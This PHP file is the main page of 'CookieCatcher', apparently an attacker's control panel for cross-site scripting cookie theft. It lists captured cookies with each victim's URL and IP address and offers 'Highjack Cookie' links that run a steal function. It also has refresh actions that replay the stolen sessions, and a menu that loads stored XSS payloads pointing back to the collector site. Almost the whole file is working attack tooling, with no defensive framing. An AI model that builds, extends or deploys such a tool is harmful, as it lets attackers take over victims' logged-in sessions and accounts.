<?php
include('inc/configure.php');
include('inc/mysql_querylab.php');
include('inc/cookieCatcher.php');

////////////////////////////////////
## Initiate Objects/Classes
$catcher = new cookieCatcher();

////////////////////////////////////
## Initiate DB Connection
$catcher->connect($db_HOST,$db_USERNAME,$db_PASSWORD,$db_NAME);

////////////////////////////////////
## Declare Variables
$message = '';
$cookieResults = '';

////////////////////////////////////
## Cookie Commands
if(isset($_GET['action'])) {
  switch($_GET['action']) {
    case 'refresh':
      $result = $catcher->refresh($_GET['cookieID']);
      $message .= $result ? "Cookie #".htmlspecialchars($_GET['cookieID'])." Refreshed<br/>" : "An error occurred.<br/>";
      $message .= "<iframe id=\"frame\" src=\"".$siteURL."?cookieID=".htmlspecialchars($_GET['cookieID'])."&action=view\"></iframe>";
      break;
    case 'refresh-all':
      //do something
      $cookies = $catcher->view();
      if($cookies->recordCount>0) {
        foreach($cookies->results as $cookie) {
          $result = $catcher->refresh($cookie['id']);
          $message .= $result ? "Cookie #".htmlspecialchars($cookie['id'])." Refreshed<br/>" : "An error occurred.<br/>";
        }
      }
      die($message);
      break;
    case 'steal':
      $result = $catcher->steal($_GET['cookieID']);
      $message = "<pre id=\"payload2\">$result</pre>";
      $message .= "<iframe id=\"frame\" src=\"".$siteURL."?cookieID=".htmlspecialchars($_GET['cookieID'])."&action=view\"></iframe>";
      break;
    case 'view':
      $result = $catcher->refresh($_GET['cookieID']);
      $message .= "<div id=\"view\">".$result."</div>";
      die($message); // Leave this... loads content to the iframe
      break;
    default:
      //do nothing
  }
}

////////////////////////////////////
## Load Stored Cookies
if(isset($_GET['cookieID'])) {
  $cookies = $catcher->view($_GET['cookieID']);
} else {
  $cookies = $catcher->view();
}

////////////////////////////////////
## Print Cookies to Page
if($cookies->recordCount>0) {
  foreach($cookies->results as $cookie) {
    $cookieResults .= "<div class=\"column\">#".$cookie['id']."</div><div class=\"column\" style=\"width:50%;\">".$cookie['url']." (".$cookie['ip'].")</div><div class=\"column right\"><a href=\"?cookieID=".$cookie['id']."&action=steal\">Highjack Cookie</a></div><br clear=\"both\"/><hr/>";
  }
} else {
  $cookieResults = "Cookie #".$cookie['id']."not found.";
  $cookieResults = "<div style=\"padding:10px 0 0 10px;\">no cookies found.</div>";
}

////////////////////////////////////
## SET ATTACK/PAYLOAD
$pl = $catcher->payloads();
foreach($pl->results as $payload) {
  $payloads[$payload['id']]['name'] = $payload['name'];
  $payloads[$payload['id']]['payload'] = urlencode(str_replace('{siteURL}',$siteURL,$payload['payload']));
}

?>

<html>
<head>
<title>CookieCatcher BETA v0.1</title>
<script>
function c() {
  p = document.getElementById('payloadcode');
  l = document.getElementById('counter');
  l.value = p.value.length;
}
function u(pid) {
  document.getElementById('payloadcode').value = unescape(payload[pid].replace("+"," "));
  c();
}
var payload = new Array();
payload[0] = "";
<?php foreach($payloads as $k=>$p) { ?>
payload[<?php echo $k;?>] = "<?php echo $p['payload'];?>";
<?php } ?>
</script>
<link href="style.css" rel="stylesheet">
</head>

<body onload="c()">
<pre id="ascii">
      ...                                        ..         .                        ...                           s                                            
   xH88"`~ .x8X                            < .z@8"`        @88>                   xH88"`~ .x8X                    :8                .uef^"                      
 :8888   .f"8888Hf        u.          u.    !@88E          %8P                  :8888   .f"8888Hf                .88              :d88E                     .u    .
:8888>  X8L  ^""`   ...ue888b   ...ue888b   '888E   u       .         .u       :8888>  X8L  ^""`        u       :888ooo       .   `888E            .u     .d88B :@8c
X8888  X888h        888R Y888r  888R Y888r   888E u@8NL   .@88u    ud8888.     X8888  X888h          us888u.  -*8888888  .udR88N   888E .z8k    ud8888.  ="8888f8888r
88888  !88888.      888R I888>  888R I888>   888E`"88*"  ''888E` :888'8888.    88888  !88888.     .@88 "8888"   8888    <888'888k  888E~?888L :888'8888.   4888>'88"
88888   %88888      888R I888>  888R I888>   888E .dN.     888E  d888 '88%"    88888   %88888     9888  9888    8888    9888 'Y"   888E  888E d888 '88%"   4888> '
88888 '> `8888>     888R I888>  888R I888>   888E~8888     888E  8888.+"       88888 '> `8888>    9888  9888    8888    9888       888E  888E 8888.+"      4888>
`8888L %  ?888   ! u8888cJ888  u8888cJ888    888E '888&    888E  8888L         `8888L %  ?888   ! 9888  9888   .8888Lu= 9888       888E  888E 8888L       .d888L .+
 `8888  `-*""   /   "*888*P"    "*888*P"     888E  9888.   888&  '8888c. .+     `8888  `-*""   /  9888  9888   ^%888*   ?8888u../  888E  888E '8888c. .+  ^"8888*"
   "888.      :"      'Y"         'Y"      '"888*" 4888"   R888"  "88888%         "888.      :"   "888*""888"    'Y"     "8888P'  m888N= 888>  "88888%       "Y"
     `""***~"`                                ""    ""      ""      "YP'            `""***~"`      ^Y"   ^Y'               "P'     `Y"   888     "YP'           
                                                                                                                                        J88"                    
                                                                                                                                        @%                      
                                                                                                                                      :"                        
</pre>

<?php if($message=='') { ?>
<div id="tag">XSS Payload</div>
<div id="payload">
  <div class="payloadselect">
    <select onchange="u(this.value);">
      <option value="0">-- select an attack--</option>
      <?php foreach($payloads as $k=>$p) { ?>
      <option value="<?php echo $k;?>"><?php echo $p['name'];?></option>
      <?php } ?>
    </select>
  </div>
  <div class="payloadcode"><input type="text" id="payloadcode" onkeyup="c()" value="" size=60/><input type="text" id="counter" value=""/></div><br clear="both"/>
</div>
<?php } ?>

    <?php if(isset($_GET['reset'])) {
      $reset = $catcher->reset();
    }?>

<p><?php echo $message; ?></p>

<?php if($message=='') { ?>
  <div class="table"><a class="button" href="?reset"><p>Delete All</a><a class="button" href="?CookieID">Refresh</p></a></div>
<?php } ?>

<div class="table"><?php echo $message=='' ? $cookieResults : '<a class="button" href="?">back</a><a class="button" href="?">delete</a>'; ?></p></div>



</body>
</html>
